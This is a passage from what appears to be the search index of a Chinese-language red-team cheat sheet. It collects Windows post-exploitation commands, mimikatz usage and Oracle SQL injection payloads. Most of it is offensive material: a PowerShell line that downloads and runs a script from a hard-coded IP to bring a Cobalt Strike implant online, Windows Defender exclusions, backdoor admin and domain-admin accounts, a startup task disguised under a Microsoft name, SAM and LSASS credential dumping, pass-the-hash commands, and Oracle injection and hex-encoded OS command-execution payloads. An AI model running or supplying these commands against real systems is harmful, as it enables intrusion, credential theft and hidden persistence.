AM'\"","title":"\u4fee\u6539\u6587\u4ef6\u65f6\u95f4"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_3","text":"\u67e5\u770b\u7aef\u53e3\u5bf9\u5e94 PID\uff1a netstat -ano | findstr :80 \u67e5\u770b PID \u5bf9\u5e94\u7a0b\u5e8f\uff1a tasklist /FI \"PID eq 1234\" \u6839\u636e PID \u67e5\u770b\u7a0b\u5e8f\u6240\u5728\u76ee\u5f55\uff1a wmic process where ProcessId=1234 get ExecutablePath \u6267\u884c\u8fdb\u7a0b\uff1a start /b xxx.exe \u6839\u636e\u540d\u79f0\u7ed3\u675f\u8fdb\u7a0b\uff1a taskkill /f /t /im GotoHTTP.exe \u641c\u7d22\u8fdb\u7a0b tasklist | findstr \"powershell\"","title":"\u8fdb\u7a0b\u64cd\u4f5c"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#powershell-exe","text":"powershell -executionPolicy bypass Start-Process -WindowStyle hidden -FilePath 'C:/Windows/temp/rd.exe'","title":"Powershell \u65e0\u7a97\u53e3\u6267\u884c EXE"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#net","text":"\u67e5\u770b\u7528\u6237\u5217\u8868: net user powershell\u67e5\u770b\u7528\u6237\u5217\u8868: Get-WmiObject -Class Win32_UserAccount \u67e5\u770b\u7528\u6237\u7ec4\u5217\u8868: net localgroup \u67e5\u770b\u7ba1\u7406\u7ec4\u5217\u8868: net localgroup Administrators \u6dfb\u52a0\u7528\u6237\u5e76\u8bbe\u7f6e\u5bc6\u7801: net user test P@ssw0rd /add \u5c06\u7528\u6237\u52a0\u5165\u7ba1\u7406\u7ec4: net localgroup Administrators test /add \u5c06\u7528\u6237\u52a0\u5165\u684c\u9762\u7ec4: net localgroup \"Remote Desktop Users\" guest /add \u6fc0\u6d3bguest\u7528\u6237: net user guest /active:yes \u66f4\u6539guest\u7528\u6237\u7684\u5bc6\u7801: net user guest P@ssw0rd \u5c06\u7528\u6237\u52a0\u5165\u7ba1\u7406\u7ec4: net localgroup administrators guest /add \u5c06\u7528\u6237\u52a0\u5165\u684c\u9762\u7ec4: net localgroup \"Remote Desktop Users\" guest /add \u67e5\u770b\u672c\u5730\u5bc6\u7801\u7b56\u7565: net accounts \u67e5\u770b\u5f53\u524d\u4f1a\u8bdd: net session \u5efa\u7acbIPC\u4f1a\u8bdd: net use \\\\127.0.0.1\\c$ \"P@ssw0rd\" /user:\"domain\\Administrator\"","title":"net \u547d\u4ee4"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#netsh","text":"\u67e5\u770b\u9632\u706b\u5899\u914d\u7f6e\uff1a netsh firewall show config Windows Server 2003 \u53ca\u4e4b\u524d\u7684\u7248\u672c\uff0c\u5141\u8bb8\u6307\u5b9a\u7a0b\u5e8f\u5168\u90e8\u8fde\u63a5 netsh firewall add allowedprogram C:\\nc.exe \"allow nc\" enable Windows Server 2003\u4e4b\u540e\u7684\u7248\u672c netsh advfirewall firewall add rule name=\"pass nc\" dir in action=allow program=\"C:\\nc.exe \u5141\u8bb83389\u653e\u884c netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow","title":"netsh \u64cd\u4f5c\u9632\u706b\u5899"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#windows-defender","text":"C:\\Windows\\System32\\wbem\\wmic.exe /Node:localhost /Namespace:\\\\Root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference call Add ExclusionPath=C:\\ powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath \"C:\\test\"","title":"WIndows Defender \u52a0\u767d\u6392\u9664\u76ee\u5f55\uff1a"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_4","text":"echo test > C:\\test.txt set /p=test<nul>C:\\test.txt //\u89c4\u907f\u7a7a\u683c echo.123>>a.txt echo,123>>a.txt type;a.txt //\u5c06base64\u7f16\u7801\u7684\u6587\u4ef6\u89e3\u7801\u5199\u5165\u5230 test.jsp certutil -f -decode base64.txt C:\\\\test.jsp //\u5c06\u5341\u516d\u8fdb\u5236\u6587\u4ef6\u89e3\u7801\u5199\u5165\u5230 test.jsp certutil -decodehex hex.txt C:\\\\test.jsp","title":"\u6587\u4ef6\u5199\u5165"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_5","text":"","title":"\u6ce8\u518c\u8868\uff1a"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#restricted-admin-mode","text":"\u5bf9\u5e94\u547d\u4ee4\u884c\u5f00\u542f Restricted Admin mode \u547d\u4ee4\u5982\u4e0b\uff1a REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f \u67e5\u770b\u662f\u5426\u5df2\u5f00\u542f DisableRestrictedAdmin REG_DWORD 0x0 \u5b58\u5728\u5c31\u662f\u5f00\u542f REG query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" | findstr \"DisableRestrictedAdmin\"","title":"Restricted Admin Mode"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#3389","text":"REG query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber","title":"\u67e5\u770b3389\u7aef\u53e3"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_6","text":"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f \u6216\u8005 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1","title":"\u5f00\u542f\u8fdc\u7a0b\u684c\u9762"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#sam","text":"reg save HKLM\\SYSTEM sys.hiv reg save HKLM\\SAM sam.hiv \u590d\u5236\uff1a C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SAM \u4f7f\u7528 https://github.com/3gstudent/NinjaCopy \u8fdb\u884c\u590d\u5236\u3002 lsadump::sam /sam:sam.hiv /system:system.hiv","title":"\u5bfc\u51fa SAM \u6570\u636e\u5e93"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_7","text":"## \u5927\u5c0f\u4e3a\u5b57\u8282\u78c1\u76d8 ::\u67e5\u770bC\u76d8 wmic LogicalDisk where \"Caption='C:'\" get FreeSpace,Size /value ::\u67e5\u770bD\u76d8 wmic LogicalDisk where \"Caption='D:'\" get FreeSpace,Size /value","title":"\u67e5\u770b\u76d8\u7b26\u5269\u4f59\u7a7a\u95f4"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_8","text":"#\u641c\u7d22 D \u76d8\u4e0b\u540d\u4e3a shell.jsp \u7684\u6587\u4ef6 cd /d D:\\ && dir /b /s shell.jsp #\u641c\u7d20 D \u76d8\u4e0b\u540e\u7f00\u4e3a conf \u5185\u5bb9\u4e14\u5305\u542b password\uff08\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff09: findstr /s /i /n /d:D:\\ \"password\" *.conf","title":"\u641c\u7d22\u6587\u4ef6\uff1a"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#cs","text":"powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://122.114.55.117:8012/download/upload.ps1') msiexec /q /i http://127.0.0.1:8080/ms10-051.msi","title":"CS \u4e0a\u7ebf"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_9","text":"attrib +s +a +h +r cs.exe // \u7ed9\u6587\u4ef6\u8bbe\u7f6e\u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\u3001\u5b58\u6863\u6587\u4ef6\u5c5e\u6027\u3001\u9690\u85cf\u6587\u4ef6\u5c5e\u6027\u3001\u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027","title":"\u8bbe\u7f6e\u6587\u4ef6\u5c5e\u6027"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_10","text":"schtasks /create /ru system /tn \"Microsoft\\Windows\\Multimedia\\SystemMediaService\" /sc ONSTART /tr \"C:\\cs.exe\" // \u521b\u5efa\u4e00\u4e2a\u540d\u4e3aMicrosoft\\Windows\\Multimedia\\SystemMediaService\uff0c\u5f00\u673a\u65f6\u6267\u884c c:\\cs.exe \u7684\u8ba1 \u5212\u4efb\u52a1\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 schtasks /change /tn \"Microsoft\\Windows\\Multimedia\\SystemSoundsService\" /ru system /tr \"C:\\cs.exe\" /enable // \u4fee\u6539Microsoft\\Windows\\Multimedia\\SystemSoundsService \u8ba1\u5212\u4efb\u52a1\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c \u66f4\u6539\u4efb\u52a1\u65e0\u6cd5\u901a\u8fc7 /sc\u3001/mo \u53c2\u6570\u66f4\u6539\u8ba1\u5212\u9891\u7387","title":"\u8ba1\u5212\u4efb\u52a1"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#rdp","text":"#\u5217\u51fa\u6240\u6709 RDP \u51ed\u8bc1 C:\\Users\\\u7528\u6237\u540d\\AppData\\Local\\Microsoft\\Credentials dir /a C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials","title":"RDP \u51ed\u636e"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#windows_1","text":"powershell -Command \"Compress-Archive -Path E:\\update\\ -DestinationPath E:\\test.zip\" 7z.exe a -r -p12345 C:\\webs\\1.7z C:\\webs\\ zip -r C:\\webs\\1.zip C:\\webs\\","title":"Windows \u6253\u5305\u76ee\u5f55\u4e0a\u4f20\u6587\u4ef6"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_11","text":"whoami /user //\u67e5\u770b\u5f53\u524d\u7528\u6237\u6743\u9650 net config workstation //\u53ef\u77e5\u57df\u540d\u548c\u5176\u4ed6\u4fe1\u606f net user /domain //\u67e5\u8be2\u57df\u7528\u6237 net user edgeuser Admin12345 /add /domain //\u6dfb\u52a0\u57df\u7528\u6237 net group \"domain admins\" edgeuser /add /domain //\u6dfb\u52a0\u57df\u7ba1\u7406\u5458 net group \"enterprise admins\" edgeuser /add /domain //\u6dfb\u52a0\u4f01\u4e1a\u7ba1\u7406\u5458 net group \"domain admins\" /domain //\u67e5\u8be2\u57df\u7ba1\u7406\u5458\u7528\u6237 net group \"enterprise admins\" /domain //\u67e5\u8be2\u57df\u4f01\u4e1a\u7ba1\u7406\u7ec4 net localgroup administrators /domain //\u67e5\u8be2\u57df\u672c\u5730\u7ba1\u7406\u7ec4 net time /domain //\u67e5\u8be2\u57df\u63a7\u5236\u5668\u548c\u65f6\u95f4 net view /domain //\u67e5\u8be2\u57df\u540d\u79f0 net view /domain:redteam.local //\u67e5\u8be2\u57df\u5185\u8ba1\u7b97\u673a net group \"domain computers\" /domain //\u67e5\u770b\u5f53\u524d\u57df\u5185\u8ba1\u7b97\u673a\u5217\u8868 net group \"domain controllers\" /domain //\u67e5\u770b\u57df\u63a7\u673a\u5668\u540d net accounts /domain //\u67e5\u770b\u57df\u5bc6\u7801\u7b56\u7565 nltest /domain_trusts //\u67e5\u770b\u57df\u4fe1\u4efb nltest /domain_trusts /all_trusts /v /server:10.10.10.10 //\u67e5\u770b\u67d0\u4e2a\u57df\u7684\u57df\u4fe1\u4efb nslookup -type=SRV _ldap._tcp.corp //\u901a\u8fc7srv\u8bb0\u5f55\u67e5\u627e\u57df\u63a7\u5236\u5668","title":"\u57df\u6e17\u900f\u547d\u4ee4"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/","text":"mimikatz \u5b98\u65b9 Github\uff1ahttps://github.com/gentilkiwi/mimikatz \u83b7\u53d6\u767b\u5f55\u51ed\u8bc1\u4fe1\u606f mimikatz.exe log \"privilege::debug\" \"sekurlsa::logonpasswords\" exit privilege::debug sekurlsa::logonpasswords lsass.exe \u5bfc\u51fa\u51ed\u636e mimikatz.exe log \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" exit mimikatz PTH \u4f20\u9012 cmd mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:cmd.exe\" \"exit\" mimikatz PTH \u4f20\u9012 mstsc mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:mstsc.exe /restrictedadmin\" \"exit\" privilege::debug sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 \"/run:mstsc.exe /restrictedadmin\" SAM \u6570\u636e\u5e93\u5bfc\u51fa\u51ed\u636e mimikatz \"log\" \"lsadump::sam /sam:sam.hive /system:system.hive\" \"exit\" bat \u811a\u672c\u83b7\u53d6\u51ed\u636e @echo off cd /d D:\\tools\\ mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > C:\\windows\\temp\\log.txt","title":"mimikatz"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#mimikatz","text":"\u5b98\u65b9 Github\uff1ahttps://github.com/gentilkiwi/mimikatz","title":"mimikatz"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#_1","text":"mimikatz.exe log \"privilege::debug\" \"sekurlsa::logonpasswords\" exit privilege::debug sekurlsa::logonpasswords","title":"\u83b7\u53d6\u767b\u5f55\u51ed\u8bc1\u4fe1\u606f"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#lsassexe","text":"mimikatz.exe log \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" exit","title":"lsass.exe \u5bfc\u51fa\u51ed\u636e"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#mimikatz-pth-cmd","text":"mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:cmd.exe\" \"exit\"","title":"mimikatz PTH \u4f20\u9012 cmd"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#mimikatz-pth-mstsc","text":"mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:mstsc.exe /restrictedadmin\" \"exit\" privilege::debug sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 \"/run:mstsc.exe /restrictedadmin\"","title":"mimikatz PTH \u4f20\u9012 mstsc"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#sam","text":"mimikatz \"log\" \"lsadump::sam /sam:sam.hive /system:system.hive\" \"exit\"","title":"SAM \u6570\u636e\u5e93\u5bfc\u51fa\u51ed\u636e"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/#bat","text":"@echo off cd /d D:\\tools\\ mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > C:\\windows\\temp\\log.txt","title":"bat \u811a\u672c\u83b7\u53d6\u51ed\u636e"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/","text":"oracle oracle\u67e5\u6700\u5927\u6570\u91cf\u8868 select t.table_name,t.tablespace_name,t.owner,t.num_rows from all_tables t ORDER BY NUM_ROWS DESC; select t.table_name,t.tablespace_name,t.owner,t.num_rows from all_tables t ORDER BY NUM_ROWS DESC; select t.table_name tableName, f.comments comments from user_tables t inner join user_tab_comments f on t.table_name = f.table_name \u67e5\u8be2\u5305\u542b user \u5b57\u6bb5\u5728\u54ea\u4e2a\u5e93\u54ea\u4e2a\u8868 SELECT owner AS database_name, table_name, column_name FROM all_tab_columns WHERE column_name LIKE '%USER%' ORDER BY owner, table_name, column_name; Oracle SQL \u9ed8\u8ba4\u6570\u636e\u5e93 Name Description SYSTEM \u9002\u7528\u4e8e\u6240\u6709\u7248\u672c SYSAUX \u9002\u7528\u4e8e\u6240\u6709\u7248\u672c Oracle SQL \u6ce8\u91ca Type Description -- - SQL comment Oracle SQL \u7248\u672c SELECT user FROM dual UNION SELECT * FROM v$version SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'; SELECT banner FROM v$version WHERE banner LIKE 'TNS%'; SELECT version FROM v$instance; Oracle SQL \u4e3b\u673a\u540d SELECT host_name FROM v$instance; (Privileged) SELECT UTL_INADDR.get_host_name FROM dual; SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; SELECT UTL_INADDR.get_host_address FROM dual; Oracle SQL \u6570\u636e\u5e93\u540d\u79f0 SELECT global_name FROM global_name; SELECT name FROM V$DATABASE; SELECT instance_name FROM V$INSTANCE; SELECT SYS.DATABASE_NAME FROM DUAL; Oracle SQL \u6570\u636e\u5e93\u51ed\u8bc1 SQL \u8bed\u53e5 \u63cf\u8ff0 SELECT username FROM all_users; \u9002\u7528\u4e8e\u6240\u6709\u7248\u672c SELECT name, password from sys.user$; Privileged, <= 10g SELECT name, spare4 from sys.user$; Privileged, <= 11g Oracle SQL \u5217\u51fa\u6570\u636e\u5e93 SELECT DISTINCT owner FROM all_tables; Oracle SQL \u5217\u51fa\u5217 SELECT column_name FROM all_tab_columns WHERE table_name = 'blah'; SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo'; Oracle SQL \u5217\u51fa\u8868 SELECT table_name FROM all_tables; SELECT owner, table_name FROM all_tables; SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%'; Oracle SQL \u62a5\u9519\u6ce8\u5165 Description Query Invalid HTTP Request SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual CTXSYS.DRITHSX.SN SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual Invalid XPath SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual Invalid XML SELECT to_char(dbms_xmlgen.getxml('select \"'&#124;&#124;(select user from sys.dual)&#124;&#124;'\" FROM sys.dual')) FROM dual Invalid XML SELECT rtrim(extract(xmlagg(xmlelement(\"s\", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users SQL Error SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) XDBURITYPE getblob XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob() XDBURITYPE getclob XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob() When the injection point is inside a string use : '||PAYLOAD-- Oracle SQL \u76f2\u6ce8 Description Query Version is 12.2 SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%'; Subselect is enabled SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual) Table log_table exists SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table); Column message exists in table log_table SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; First letter of first message is t SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%'; Oracle SQL \u65f6\u95f4\u6ce8\u5165 AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) Oracle SQL \u547d\u4ee4\u6267\u884c ODAT (Oracle Database Attacking Tool) Oracle Java Execution List Java privileges sql select * from dba_java_policy select * from user_java_policy Grant privileges sql exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute'); exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', ''); exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', ''); Execute commands 10g R2, 11g R1 and R2: DBMS_JAVA_TEST.FUNCALL() sql SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe','/c', 'dir >c:\\test.txt') FROM DUAL SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual 11g R1 and R2: DBMS_JAVA.RUNJAVA() sql SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL Oracle Java Class /* create Java class */ BEGIN EXECUTE IMMEDIATE 'create or replace and compile java source named \"PwnUtil\" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};'; END; / BEGIN EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';'; END; / /* run OS command */ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual; or (hex encoded) /* create Java class */ SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d'')); EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual /* run OS command */ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual; References NetSpi - SQL Wiki ASDC12 - New and Improved Hacking Oracle From Web - OWASP Pentesting Oracle TNS Listener - HackTricks ODAT: Oracle Database Attacking Tool - quentinhardy WebSec CheatSheet - Oracle New payload to exploit Error-based SQL injection - Oracle database - Mannu Linux - 12/09/2023 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md","title":"oracle"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle","text":"","title":"oracle"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle_1","text":"select t.table_name,t.tablespace_name,t.owner,t.num_rows from all_tables t ORDER BY NUM_ROWS DESC; select t.table_name,t.tablespace_name,t.owner,t.num_rows from all_tables t ORDER BY NUM_ROWS DESC; select t.table_name tableName, f.comments comments from user_tables t inner join user_tab_comments f on t.table_name = f.table_name","title":"oracle\u67e5\u6700\u5927\u6570\u91cf\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#user","text":"SELECT owner AS database_name, table_name, column_name FROM all_tab_columns WHERE column_name LIKE '%USER%' ORDER BY owner, table_name, column_name;","title":"\u67e5\u8be2\u5305\u542b user \u5b57\u6bb5\u5728\u54ea\u4e2a\u5e93\u54ea\u4e2a\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql","text":"Name Description SYSTEM \u9002\u7528\u4e8e\u6240\u6709\u7248\u672c SYSAUX \u9002\u7528\u4e8e\u6240\u6709\u7248\u672c","title":"Oracle SQL \u9ed8\u8ba4\u6570\u636e\u5e93"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_1","text":"Type Description -- - SQL comment","title":"Oracle SQL \u6ce8\u91ca"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_2","text":"SELECT user FROM dual UNION SELECT * FROM v$version SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'; SELECT banner FROM v$version WHERE banner LIKE 'TNS%'; SELECT version FROM v$instance;","title":"Oracle SQL \u7248\u672c"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_3","text":"SELECT host_name FROM v$instance; (Privileged) SELECT UTL_INADDR.get_host_name FROM dual; SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; SELECT UTL_INADDR.get_host_address FROM dual;","title":"Oracle SQL \u4e3b\u673a\u540d"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_4","text":"SELECT global_name FROM global_name; SELECT name FROM V$DATABASE; SELECT instance_name FROM V$INSTANCE; SELECT SYS.DATABASE_NAME FROM DUAL;","title":"Oracle SQL \u6570\u636e\u5e93\u540d\u79f0"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_5","text":"SQL \u8bed\u53e5 \u63cf\u8ff0 SELECT username FROM all_users; \u9002\u7528\u4e8e\u6240\u6709\u7248\u672c SELECT name, password from sys.user$; Privileged, <= 10g SELECT name, spare4 from sys.user$; Privileged, <= 11g","title":"Oracle SQL \u6570\u636e\u5e93\u51ed\u8bc1"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_6","text":"SELECT DISTINCT owner FROM all_tables;","title":"Oracle SQL \u5217\u51fa\u6570\u636e\u5e93"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_7","text":"SELECT column_name FROM all_tab_columns WHERE table_name = 'blah'; SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';","title":"Oracle SQL \u5217\u51fa\u5217"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_8","text":"SELECT table_name FROM all_tables; SELECT owner, table_name FROM all_tables; SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';","title":"Oracle SQL \u5217\u51fa\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_9","text":"Description Query Invalid HTTP Request SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual CTXSYS.DRITHSX.SN SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual Invalid XPath SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual Invalid XML SELECT to_char(dbms_xmlgen.getxml('select \"'&#124;&#124;(select user from sys.dual)&#124;&#124;'\" FROM sys.dual')) FROM dual Invalid XML SELECT 